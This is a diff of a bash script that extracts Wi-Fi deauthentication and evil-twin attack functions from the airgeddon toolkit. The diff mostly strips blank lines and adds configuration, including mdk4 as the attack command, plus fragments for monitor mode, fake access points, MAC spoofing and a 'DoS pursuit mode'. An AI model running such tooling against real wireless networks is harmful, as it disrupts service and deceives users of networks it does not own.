@@ -1,31 +1,30 @@
-
-# ========================
-# deauth 코드
-#
-#
-#
-# 함수 목록
-# ========================
-exec_et_deauth()
-launch_dos_pursuit_mode_attack() 
-get_tmux_process_id()       
-pid_control_pursuit_mode()  
-manage_output()       
-prepare_et_monitor()      
-recalculate_windows_sizes()  
-debug_print()  
-language_strings_handling_messages() 
-kill_dos_pursuit_mode_processes()
-kill_pid_and_children_recursive()
-launch_fake_ap()
-set_spoofed_mac()
-start_tmux_processes()
-disable_rfkill()
-detect_screen_resolution()
-set_windows_sizes()
-set_xsizes()
-set_ypositions()
-set_ysizes()
+eauth · SH
+#!/usr/bin/env bash
+#shellcheck disable=SC2154,SC2034
+ 
+# ============================================================
+# Deauth Attack - Standalone Script
+# Extracted from wfast.sh (airgeddon)
+# ============================================================
+ 
+# --- Internal fixed values ---
+mdk_command="mdk4"
+check_kill_needed=1
+interface_airmon_compatible=1
+et_initial_state="Managed"
+ifacemode="Managed"
+ 
+# --- Internal constants ---
+et_mode="et_deauth"
+AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING:-xterm}"
+AIRGEDDON_DEBUG_MODE="${AIRGEDDON_DEBUG_MODE:-false}"
+AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING="${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"
+AIRGEDDON_5GHZ_ENABLED="${AIRGEDDON_5GHZ_ENABLED:-true}"
+ 
+tmpdir="/tmp/et_deauth_$$/"
+scriptfolder="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/"
+system_tmpdir="/tmp/"
+airmon="airmon-ng"
 
 
 function exec_et_deauth() {
@@ -84,13 +83,6 @@ function exec_et_deauth() {
 		sleep 1
 	fi
 }
-
-
-
-
-
-
-
 
 function launch_dos_pursuit_mode_attack() {
 
@@ -284,21 +276,6 @@ function launch_dos_pursuit_mode_attack() {
 	done
 }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 function get_tmux_process_id() {
 
 	debug_print
@@ -315,10 +292,6 @@ function get_tmux_process_id() {
 		global_process_pid="${process_pid}"
 	fi
 }
-
-
-
-
 
 pid_control_pursuit_mode() {
 
@@ -375,12 +348,6 @@ pid_control_pursuit_mode() {
 	kill_dos_pursuit_mode_processes
 }
 
-
-
-
-
-
-
 function manage_output() {
 
 	debug_print
@@ -417,10 +384,6 @@ function manage_output() {
 	esac
 }
 
-
-
-
-
 function prepare_et_monitor() {
 
 	debug_print
@@ -435,11 +398,6 @@ function prepare_et_monitor() {
 	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
 }
 
-
-
-
-
-
 function recalculate_windows_sizes() {
 
 	debug_print
@@ -447,15 +405,6 @@ function recalculate_windows_sizes() {
 	detect_screen_resolution
 	set_windows_sizes
 }
-
-
-
-
-
-
-
-
-
 
 function debug_print() {
 
@@ -514,16 +463,6 @@ function debug_print() {
 
 	return 0
 }
-
-
-
-
-
-
-
-
-
-
 
 function language_strings_handling_messages() {
 
@@ -648,12 +587,6 @@ function language_strings_handling_messages() {
 	language_strings_key_to_continue["CHINESE"]="按 [Enter] 键继续..."
 }
 
-
-
-
-
-
-
 function kill_dos_pursuit_mode_processes() {
 
 	debug_print
@@ -668,8 +601,6 @@ function kill_dos_pursuit_mode_processes() {
 	dos_pursuit_mode_pids=()
 	sleep 1
 }
-
-
 
 function kill_pid_and_children_recursive() {
 
@@ -691,14 +622,6 @@ function kill_pid_and_children_recursive() {
 	kill "${parent_pid}" &> /dev/null
 	wait "${parent_pid}" 2> /dev/null
 	}
-
-
-
-
-
-
-
-
 
 function launch_fake_ap() {
 
@@ -769,19 +692,6 @@ function launch_fake_ap() {
 	sleep 3
 }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
 function set_spoofed_mac() {
 
 	debug_print
@@ -804,11 +714,6 @@ function set_spoofed_mac() {
 	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
 	ip link set "${1}" up > /dev/null 2>&1
 }
-
-
-
-
-
 
 function start_tmux_processes() {
 
@@ -839,11 +744,6 @@ function start_tmux_processes() {
 	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
 }
 
-
-
-
-
-
 function disable_rfkill() {
 
 	debug_print
@@ -852,11 +752,6 @@ function disable_rfkill() {
 		rfkill unblock all > /dev/null 2>&1
 	fi
 }
-
-
-
-
-
 
 function detect_screen_resolution() {
 
@@ -875,11 +770,6 @@ function detect_screen_resolution() {
 
 	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
 }
-
-
-
-
-
 
 function set_windows_sizes() {
 
@@ -921,10 +811,6 @@ function set_windows_sizes() {
 	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
 }
 
-
-
-
-
 function set_xsizes() {
 
 	debug_print
@@ -944,10 +830,6 @@ function set_xsizes() {
 	xwindow=$((xhalf - xcentral_space))
 }
 
-
-
-
-
 function set_ypositions() {
 
 	debug_print
@@ -961,10 +843,6 @@ function set_ypositions() {
 	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
 	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
 }
-
-
-
-
 
 function set_ysizes() {
 
